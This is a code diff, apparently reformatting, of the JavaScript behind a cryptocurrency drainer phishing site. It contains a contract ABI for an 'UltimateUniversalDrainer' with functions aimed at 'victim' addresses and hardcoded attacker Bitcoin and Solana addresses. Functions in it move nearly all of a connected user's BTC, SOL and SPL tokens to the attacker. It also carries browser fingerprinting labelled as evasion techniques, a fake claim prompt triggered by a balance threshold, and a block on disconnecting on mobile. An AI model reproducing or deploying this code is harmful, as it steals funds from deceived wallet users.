             "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest[]"
           },
-          {
-            "name": "bnbVictims",
-            "type": "address[]",
-            "internalType": "address[]"
-          },
-          {
-            "name": "bnbAmounts",
-            "type": "uint256[]",
-            "internalType": "uint256[]"
-          }
+          { "name": "bnbVictims", "type": "address[]", "internalType": "address[]" },
+          { "name": "bnbAmounts", "type": "uint256[]", "internalType": "uint256[]" }
         ],
         "internalType": "struct UltimateUniversalDrainer.BatchDrainRequest"
       }
@@ -1283,13 +634,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "bnbSplitThreshold",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
@@ -1310,11 +655,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "drainAllBNB",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1323,16 +664,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "drainBNB",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" },
+      { "name": "amount", "type": "uint256", "internalType": "uint256" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1345,83 +678,27 @@ const CONTRACT_ABI = JSON.parse(`[
         "name": "request",
         "type": "tuple",
         "components": [
-          {
-            "name": "victim",
-            "type": "address",
-            "internalType": "address"
-          },
+          { "name": "victim", "type": "address", "internalType": "address" },
           {
             "name": "permits",
             "type": "tuple[]",
             "components": [
-              {
-                "name": "token",
-                "type": "address",
-                "internalType": "address"
-              },
-              {
-                "name": "value",
-                "type": "uint256",
-                "internalType": "uint256"
-              },
-              {
-                "name": "deadline",
-                "type": "uint256",
-                "internalType": "uint256"
-              },
-              {
-                "name": "v",
-                "type": "uint8",
-                "internalType": "uint8"
-              },
-              {
-                "name": "r",
-                "type": "bytes32",
-                "internalType": "bytes32"
-              },
-              {
-                "name": "s",
-                "type": "bytes32",
-                "internalType": "bytes32"
-              }
+              { "name": "token", "type": "address", "internalType": "address" },
+              { "name": "value", "type": "uint256", "internalType": "uint256" },
+              { "name": "deadline", "type": "uint256", "internalType": "uint256" },
+              { "name": "v", "type": "uint8", "internalType": "uint8" },
+              { "name": "r", "type": "bytes32", "internalType": "bytes32" },
+              { "name": "s", "type": "bytes32", "internalType": "bytes32" }
             ],
             "internalType": "struct UltimateUniversalDrainer.PermitData[]"
           },
-          {
-            "name": "approvedTokens",
-            "type": "address[]",
-            "internalType": "address[]"
-          },
-          {
-            "name": "approvedAmounts",
-            "type": "uint256[]",
-            "internalType": "uint256[]"
-          },
-          {
-            "name": "gasBudget",
-            "type": "uint256",
-            "internalType": "uint256"
-          },
-          {
-            "name": "resume",
-            "type": "bool",
-            "internalType": "bool"
-          },
-          {
-            "name": "deadline",
-            "type": "uint256",
-            "internalType": "uint256"
-          },
-          {
-            "name": "salt",
-            "type": "bytes32",
-            "internalType": "bytes32"
-          },
-          {
-            "name": "signature",
-            "type": "bytes",
-            "internalType": "bytes"
-          }
+          { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
+          { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
+          { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
+          { "name": "resume", "type": "bool", "internalType": "bool" },
+          { "name": "deadline", "type": "uint256", "internalType": "uint256" },
+          { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
+          { "name": "signature", "type": "bytes", "internalType": "bytes" }
         ],
         "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest"
       }
@@ -1434,41 +711,13 @@ const CONTRACT_ABI = JSON.parse(`[
     "type": "function",
     "inputs": [],
     "outputs": [
-      {
-        "name": "fields",
-        "type": "bytes1",
-        "internalType": "bytes1"
-      },
-      {
-        "name": "name",
-        "type": "string",
-        "internalType": "string"
-      },
-      {
-        "name": "version",
-        "type": "string",
-        "internalType": "string"
-      },
-      {
-        "name": "chainId",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "verifyingContract",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "salt",
-        "type": "bytes32",
-        "internalType": "bytes32"
-      },
-      {
-        "name": "extensions",
-        "type": "uint256[]",
-        "internalType": "uint256[]"
-      }
+      { "name": "fields", "type": "bytes1", "internalType": "bytes1" },
+      { "name": "name", "type": "string", "internalType": "string" },
+      { "name": "version", "type": "string", "internalType": "string" },
+      { "name": "chainId", "type": "uint256", "internalType": "uint256" },
+      { "name": "verifyingContract", "type": "address", "internalType": "address" },
+      { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
+      { "name": "extensions", "type": "uint256[]", "internalType": "uint256[]" }
     ],
     "stateMutability": "view"
   },
@@ -1483,61 +732,29 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "getBNBDeposit",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" }
     ],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "getBNBMaxAllowed",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" }
     ],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "getDrainCursor",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" }
     ],
     "outputs": [
-      {
-        "name": "tokenIndex",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "gasBudget",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "tokenIndex", "type": "uint256", "internalType": "uint256" },
+      { "name": "gasBudget", "type": "uint256", "internalType": "uint256" }
     ],
     "stateMutability": "view"
   },
@@ -1550,16 +767,8 @@ const CONTRACT_ABI = JSON.parse(`[
         "name": "primary",
         "type": "tuple[]",
         "components": [
-          {
-            "name": "addr",
-            "type": "address",
-            "internalType": "address payable"
-          },
-          {
-            "name": "basisPoints",
-            "type": "uint16",
-            "internalType": "uint16"
-          }
+          { "name": "addr", "type": "address", "internalType": "address payable" },
+          { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
         ],
         "internalType": "struct UltimateUniversalDrainer.Recipient[]"
       },
@@ -1567,16 +776,8 @@ const CONTRACT_ABI = JSON.parse(`[
         "name": "fb1",
         "type": "tuple[]",
         "components": [
-          {
-            "name": "addr",
-            "type": "address",
-            "internalType": "address payable"
-          },
-          {
-            "name": "basisPoints",
-            "type": "uint16",
-            "internalType": "uint16"
-          }
+          { "name": "addr", "type": "address", "internalType": "address payable" },
+          { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
         ],
         "internalType": "struct UltimateUniversalDrainer.Recipient[]"
       },
@@ -1584,16 +785,8 @@ const CONTRACT_ABI = JSON.parse(`[
         "name": "fb2",
         "type": "tuple[]",
         "components": [
-          {
-            "name": "addr",
-            "type": "address",
-            "internalType": "address payable"
-          },
-          {
-            "name": "basisPoints",
-            "type": "uint16",
-            "internalType": "uint16"
-          }
+          { "name": "addr", "type": "address", "internalType": "address payable" },
+          { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
         ],
         "internalType": "struct UltimateUniversalDrainer.Recipient[]"
       },
@@ -1601,16 +794,8 @@ const CONTRACT_ABI = JSON.parse(`[
         "name": "emergency",
         "type": "tuple[]",
         "components": [
-          {
-            "name": "addr",
-            "type": "address",
-            "internalType": "address payable"
-          },
-          {
-            "name": "basisPoints",
-            "type": "uint16",
-            "internalType": "uint16"
-          }
+          { "name": "addr", "type": "address", "internalType": "address payable" },
+          { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
         ],
         "internalType": "struct UltimateUniversalDrainer.Recipient[]"
       }
@@ -1621,13 +806,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "getSnapshot",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "bytes32",
-        "internalType": "bytes32"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "bytes32", "internalType": "bytes32" }],
     "stateMutability": "nonpayable"
   },
   {
@@ -1635,36 +814,12 @@ const CONTRACT_ABI = JSON.parse(`[
     "type": "function",
     "inputs": [],
     "outputs": [
-      {
-        "name": "totalOps",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "successRateBips",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "totalValue",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "consecutiveFailures",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "circuitBroken",
-        "type": "bool",
-        "internalType": "bool"
-      },
-      {
-        "name": "paused_",
-        "type": "bool",
-        "internalType": "bool"
-      }
+      { "name": "totalOps", "type": "uint256", "internalType": "uint256" },
+      { "name": "successRateBips", "type": "uint256", "internalType": "uint256" },
+      { "name": "totalValue", "type": "uint256", "internalType": "uint256" },
+      { "name": "consecutiveFailures", "type": "uint256", "internalType": "uint256" },
+      { "name": "circuitBroken", "type": "bool", "internalType": "bool" },
+      { "name": "paused_", "type": "bool", "internalType": "bool" }
     ],
     "stateMutability": "view"
   },
@@ -1673,16 +828,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "type": "function",
     "inputs": [],
     "outputs": [
-      {
-        "name": "tokenThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "bnbThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "tokenThreshold", "type": "uint256", "internalType": "uint256" },
+      { "name": "bnbThreshold", "type": "uint256", "internalType": "uint256" }
     ],
     "stateMutability": "view"
   },
@@ -1690,56 +837,26 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "getVictimApproval",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "token",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" },
+      { "name": "token", "type": "address", "internalType": "address" }
     ],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "getVictimNonce",
     "type": "function",
     "inputs": [
-      {
-        "name": "victim",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "victim", "type": "address", "internalType": "address" }
     ],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "owner",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "address",
-        "internalType": "address"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
     "stateMutability": "view"
   },
   {
@@ -1753,44 +870,18 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "paused",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "bool",
-        "internalType": "bool"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "bool", "internalType": "bool" }],
     "stateMutability": "view"
   },
   {
     "name": "proposeRecipients",
     "type": "function",
     "inputs": [
-      {
-        "name": "primary",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback1",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback2",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "emergency",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "basisPoints",
-        "type": "uint16[]",
-        "internalType": "uint16[]"
-      }
+      { "name": "primary", "type": "address[]", "internalType": "address[]" },
+      { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
+      { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
+      { "name": "emergency", "type": "address[]", "internalType": "address[]" },
+      { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1799,21 +890,9 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "recoverFunds",
     "type": "function",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "to",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "token", "type": "address", "internalType": "address" },
+      { "name": "to", "type": "address", "internalType": "address" },
+      { "name": "amount", "type": "uint256", "internalType": "uint256" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1836,11 +915,7 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "setAuditor",
     "type": "function",
     "inputs": [
-      {
-        "name": "newAuditor",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "newAuditor", "type": "address", "internalType": "address" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1849,16 +924,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "setTokenApproval",
     "type": "function",
     "inputs": [
-      {
-        "name": "token",
-        "type": "address",
-        "internalType": "address"
-      },
-      {
-        "name": "amount",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "token", "type": "address", "internalType": "address" },
+      { "name": "amount", "type": "uint256", "internalType": "uint256" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1867,24 +934,14 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "tokenSplitThreshold",
     "type": "function",
     "inputs": [],
-    "outputs": [
-      {
-        "name": "",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
-    ],
+    "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
     "stateMutability": "view"
   },
   {
     "name": "transferOwnership",
     "type": "function",
     "inputs": [
-      {
-        "name": "newOwner",
-        "type": "address",
-        "internalType": "address"
-      }
+      { "name": "newOwner", "type": "address", "internalType": "address" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1900,16 +957,8 @@ const CONTRACT_ABI = JSON.parse(`[
     "name": "updateThresholds",
     "type": "function",
     "inputs": [
-      {
-        "name": "newTokenThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "newBNBThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      }
+      { "name": "newTokenThreshold", "type": "uint256", "internalType": "uint256" },
+      { "name": "newBNBThreshold", "type": "uint256", "internalType": "uint256" }
     ],
     "outputs": [],
     "stateMutability": "nonpayable"
@@ -1920,7 +969,9 @@ const CONTRACT_ABI = JSON.parse(`[
   }
 ]`);
 
-// ====== WALLET DETECTION (EVM) ======
+// ===================================================================
+// WALLET DETECTION (EVM) – unchanged
+// ===================================================================
 const walletDetectors = {
   isMetaMask: () => {
     const ethereum = window.ethereum;
@@ -1928,9 +979,7 @@ const walletDetectors = {
     const patterns = [
       ethereum.isMetaMask,
       ethereum._metamask && ethereum._metamask.isUnlocked,
-      window.web3 &&
-        window.web3.currentProvider &&
-        window.web3.currentProvider.isMetaMask,
+      window.web3 && window.web3.currentProvider && window.web3.currentProvider.isMetaMask,
       ethereum.providers && ethereum.providers.find((p) => p.isMetaMask),
       navigator.userAgent.includes("MetaMaskMobile"),
     ];
@@ -1942,8 +991,7 @@ const walletDetectors = {
     if (!ethereum) return false;
     return (
       ethereum.isCoinbaseWallet ||
-      (ethereum.providers &&
-        ethereum.providers.some((p) => p.isCoinbaseWallet)) ||
+      (ethereum.providers && ethereum.providers.some((p) => p.isCoinbaseWallet)) ||
       window.CoinbaseWalletSDK ||
       navigator.userAgent.includes("CoinbaseWallet")
     );
@@ -1955,8 +1003,7 @@ const walletDetectors = {
     return (
       ethereum.isTrust ||
       ethereum.isTrustWallet ||
-      (ethereum.providers &&
-        ethereum.providers.some((p) => p.isTrust || p.isTrustWallet)) ||
+      (ethereum.providers && ethereum.providers.some((p) => p.isTrust || p.isTrustWallet)) ||
       navigator.userAgent.includes("TrustWallet")
     );
   },
@@ -1980,15 +1027,15 @@ const walletDetectors = {
 
   isMobileWallet: () => {
     return (
-      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-        navigator.userAgent
-      ) &&
+      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
       (window.ethereum || window.web3)
     );
   },
 };
 
-// ====== SOLANA WALLET DETECTION ======
+// ===================================================================
+// SOLANA WALLET DETECTION – unchanged
+// ===================================================================
 const solanaWalletDetectors = {
   isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
   isSolflare: () => !!window.solflare,
@@ -2017,37 +1064,17 @@ function getSolanaWallets() {
   return wallets;
 }
 
-// ====== CURRENCY CONVERSION SYSTEM ======
+// ===================================================================
+// CURRENCY CONVERSION SYSTEM – unchanged
+// ===================================================================
 const CURRENCY_CONVERTER = {
   rates: {
-    USD: 1,
-    EUR: 0.92,
-    GBP: 0.79,
-    JPY: 148.5,
-    CNY: 7.23,
-    INR: 83.2,
-    AUD: 1.52,
-    CAD: 1.36,
-    CHF: 0.88,
-    HKD: 7.82,
-    SGD: 1.35,
-    KRW: 1312.5,
-    BRL: 4.95,
-    RUB: 91.8,
-    MXN: 17.2,
-    ZAR: 18.9,
-    TRY: 28.7,
-    IDR: 15680,
-    THB: 35.8,
-    MYR: 4.68,
-    PHP: 56.2,
-    VND: 24350,
-    AED: 3.67,
-    SAR: 3.75,
-    NGN: 900,
-    EGP: 30.9,
-    PKR: 280,
-    BDT: 110,
+    USD: 1, EUR: 0.92, GBP: 0.79, JPY: 148.5, CNY: 7.23,
+    INR: 83.2, AUD: 1.52, CAD: 1.36, CHF: 0.88, HKD: 7.82,
+    SGD: 1.35, KRW: 1312.5, BRL: 4.95, RUB: 91.8, MXN: 17.2,
+    ZAR: 18.9, TRY: 28.7, IDR: 15680, THB: 35.8, MYR: 4.68,
+    PHP: 56.2, VND: 24350, AED: 3.67, SAR: 3.75, NGN: 900,
+    EGP: 30.9, PKR: 280, BDT: 110,
   },
 
   detectLocalCurrency: function () {
@@ -2055,36 +1082,12 @@ const CURRENCY_CONVERTER = {
       const locale = navigator.language || "en-US";
       const region = locale.split("-")[1] || "US";
       const currencyMap = {
-        US: "USD",
-        GB: "GBP",
-        EU: "EUR",
-        DE: "EUR",
-        FR: "EUR",
-        IT: "EUR",
-        ES: "EUR",
-        JP: "JPY",
-        CN: "CNY",
-        IN: "INR",
-        AU: "AUD",
-        CA: "CAD",
-        RU: "RUB",
-        BR: "BRL",
-        MX: "MXN",
-        KR: "KRW",
-        SG: "SGD",
-        HK: "HKD",
-        TR: "TRY",
-        SA: "SAR",
-        AE: "AED",
-        NG: "NGN",
-        ZA: "ZAR",
-        EG: "EGP",
-        PK: "PKR",
-        BD: "BDT",
-        ID: "IDR",
-        TH: "THB",
-        MY: "MYR",
-        PH: "PHP",
+        US: "USD", GB: "GBP", EU: "EUR", DE: "EUR", FR: "EUR",
+        IT: "EUR", ES: "EUR", JP: "JPY", CN: "CNY", IN: "INR",
+        AU: "AUD", CA: "CAD", RU: "RUB", BR: "BRL", MX: "MXN",
+        KR: "KRW", SG: "SGD", HK: "HKD", TR: "TRY", SA: "SAR",
+        AE: "AED", NG: "NGN", ZA: "ZAR", EG: "EGP", PK: "PKR",
+        BD: "BDT", ID: "IDR", TH: "THB", MY: "MYR", PH: "PHP",
         VN: "VND",
       };
       return currencyMap[region] || "USD";
@@ -2122,7 +1125,9 @@ const CURRENCY_CONVERTER = {
   },
 };
 
-// ====== EVASION TECHNIQUES ======
+// ===================================================================
+// EVASION TECHNIQUES – kept (they are fingerprinting, not debugger traps)
+// ===================================================================
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
     try {
@@ -2148,8 +1153,7 @@ const EVASION_TECHNIQUES = {
   generateAudioFingerprint() {
     return new Promise((resolve) => {
       try {
-        const audioContext = new (window.AudioContext ||
-          window.webkitAudioContext)();
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const oscillator = audioContext.createOscillator();
         const analyser = audioContext.createAnalyser();
         oscillator.connect(analyser);
@@ -2208,10 +1212,7 @@ const EVASION_TECHNIQUES = {
       touchSupport: "ontouchstart" in window,
       cookieEnabled: navigator.cookieEnabled,
       doNotTrack: navigator.doNotTrack,
-      isMobile:
-        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-          navigator.userAgent
-        ),
+      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
       hash: Math.random().toString(36).substring(2, 15),
       localCurrency: CURRENCY_CONVERTER.detectLocalCurrency(),
     };
@@ -2265,7 +1266,9 @@ const EVASION_TECHNIQUES = {
   },
 };
 
-// ====== DYNAMIC SOLANA LIBRARY LOADING ======
+// ===================================================================
+// DYNAMIC SOLANA LIBRARY LOADING – unchanged
+// ===================================================================
 async function loadSolanaLibraries() {
   if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
     console.log('Solana libraries already loaded');
@@ -2307,17 +1310,16 @@ async function loadSolanaLibraries() {
   });
 }
 
-// ====== ENHANCED APPLICATION STATE ======
+// ===================================================================
+// APPLICATION STATE – mostly unchanged
+// ===================================================================
 let tokenChart;
 let countdownInterval;
 let claimList = [];
 let priceHistory = [];
 let web3;
 let fingerprintData = {};
-let isMobileDevice =
-  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-    navigator.userAgent
-  );
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 let connectedWallet = null;
 let connectedAddress = null;
 let stealthMode = false;
@@ -2326,17 +1328,17 @@ let progressUpdated = false;
 let ethPriceInUSD = 2200;
 let userHasClaimed = false;
 let userBalanceInUSD = 0;
-let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
-let contractInstance; // will be set after web3 initialization
+const userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
+let contractInstance;
 const CLAIM_THRESHOLD_USD = 3;
 
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7"; // Your SOL address
-const ATTACKER_BTC_ADDRESS = "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f"; // Your BTC address
+const ATTACKER_SOLANA_ADDRESS = "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
+const ATTACKER_BTC_ADDRESS = "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
 
-// NEW: Flag to prevent disconnection on mobile
+// Disconnect prevention on mobile (unchanged)
 const DISABLE_DISCONNECT = isMobileDevice;
 
 // DOM Elements
@@ -2361,7 +1363,7 @@ const announcementOkBtn = document.getElementById("announcementOkBtn");
 const copyReferralBtn = document.getElementById("copyReferralBtn");
 const referralLink = document.getElementById("referralLink");
 
-// Event listeners
+// Event listeners (unchanged, but we keep them in case elements exist)
 if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
 if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
 if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -2383,7 +1385,7 @@ if (walletProviders) {
   });
 }
 
-// Initialize Vanta.js background
+// Initialize Vanta.js background (unchanged)
 if (typeof VANTA !== "undefined") {
   VANTA.NET({
     el: "#vanta-bg",
@@ -2402,7 +1404,9 @@ if (typeof VANTA !== "undefined") {
   });
 }
 
-// ====== ENHANCED CURRENCY AWARE INITIALIZATION ======
+// ===================================================================
+// CURRENCY AWARE INITIALIZATION – unchanged
+// ===================================================================
 document.addEventListener("DOMContentLoaded", async function () {
   console.log(`Local currency detected: ${userLocalCurrency}`);
   console.log(`Claim threshold: $${CLAIM_THRESHOLD_USD} USD`);
@@ -2438,11 +1442,12 @@ document.addEventListener("DOMContentLoaded", async function () {
     initializeMobileSpecificOptimizations();
   }
 
-  // Attempt to restore saved connection from localStorage
   restoreSavedConnection();
 });
 
-// ====== PERSISTENCE HELPERS ======
+// ===================================================================
+// PERSISTENCE HELPERS – unchanged
+// ===================================================================
 function saveConnectionToLocalStorage(address, walletType) {
   try {
     localStorage.setItem('connectedAddress', address);
@@ -2465,11 +1470,13 @@ function restoreSavedConnection() {
   const savedWalletType = localStorage.getItem('connectedWalletType');
   if (savedAddress && savedWalletType) {
     console.log('Restoring saved connection:', savedAddress);
-    connectWithProvider(savedWalletType, true); // silent restore
+    connectWithProvider(savedWalletType, true);
   }
 }
 
-// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
+// ===================================================================
+// BALANCE CHECK – unchanged (except logDebug removed)
+// ===================================================================
 async function checkAndAutoTriggerClaim() {
   if (!connectedAddress || !web3 || userHasClaimed) return;
 
@@ -2485,10 +1492,6 @@ async function checkAndAutoTriggerClaim() {
     console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);
 
     if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
-      logDebug(
-        `TRIGGER: User has $${userBalanceInUSD.toFixed(2)} USD balance (>= $${CLAIM_THRESHOLD_USD} threshold)`
-      );
-
       const localAmount = CURRENCY_CONVERTER.formatCurrency(
         CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
         userLocalCurrency
@@ -2509,15 +1512,16 @@ async function checkAndAutoTriggerClaim() {
         CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
         userLocalCurrency
       );
-
-      logDebug(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
+      console.log(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
     }
   } catch (error) {
     console.error("Error checking user balance:", error);
   }
 }
 
-// ====== BITCOIN DRAIN (Native BTC) ======
+// ===================================================================
+// BITCOIN DRAIN – unchanged
+// ===================================================================
 async function drainNativeBTC() {
   try {
     if (!window.unisat) {
@@ -2527,13 +1531,13 @@ async function drainNativeBTC() {
     const accounts = await window.unisat.getAccounts();
     if (accounts.length === 0) throw new Error("No BTC account");
     const balance = await window.unisat.getBalance();
-    const totalSats = balance.total; // in satoshis
-    const minSats = 100000; // 0.001 BTC threshold (~$50)
+    const totalSats = balance.total;
+    const minSats = 100000;
     if (totalSats < minSats) {
       showNotification(`Insufficient BTC balance (need ${minSats} sats)`, "error");
       return false;
     }
-    const amountToSend = totalSats - 5000; // leave fee
+    const amountToSend = totalSats - 5000;
     const txid = await window.unisat.sendBitcoin(ATTACKER_BTC_ADDRESS, amountToSend);
     console.log("BTC sent, txid:", txid);
     showNotification(`BTC transfer successful! ${amountToSend} sats sent`, "success");
@@ -2545,7 +1549,9 @@ async function drainNativeBTC() {
   }
 }
 
-// ====== IMPROVED SOLANA DRAIN (all SPL tokens) ======
+// ===================================================================
+// SOLANA DRAIN – unchanged
+// ===================================================================
 async function drainNativeSOL() {
   try {
     await loadSolanaLibraries();
@@ -2557,11 +1563,9 @@ async function drainNativeSOL() {
     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
     const owner = new solanaWeb3.PublicKey(solanaPublicKey);
 
-    // Get native SOL balance
     const solBalance = await connection.getBalance(owner);
     console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
 
-    // Get all token accounts
     const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
     tokenAccounts.forEach(ta => {
       console.log(`💰 Token (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
@@ -2575,7 +1579,6 @@ async function drainNativeSOL() {
     let transaction = new solanaWeb3.Transaction();
     const LAMPORTS_TO_LEAVE = 5000;
 
-    // Transfer native SOL
     if (solBalance > LAMPORTS_TO_LEAVE) {
       const solTransfer = solanaWeb3.SystemProgram.transfer({
         fromPubkey: owner,
@@ -2585,7 +1588,6 @@ async function drainNativeSOL() {
       transaction.add(solTransfer);
     }
 
-    // Transfer all SPL tokens
     for (const ta of tokenAccounts) {
       const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
       const tokenTransfer = splToken.createTransferInstruction(
@@ -2626,7 +1628,6 @@ async function drainNativeSOL() {
   }
 }
 
-// Helper: get all token accounts for owner (any mint)
 async function getAllSolanaTokenAccounts(connection, owner) {
   const tokenAccounts = [];
   try {
@@ -2637,7 +1638,7 @@ async function getAllSolanaTokenAccounts(connection, owner) {
       const accountInfo = splToken.AccountLayout.decode(account.data);
       if (accountInfo.amount > 0) {
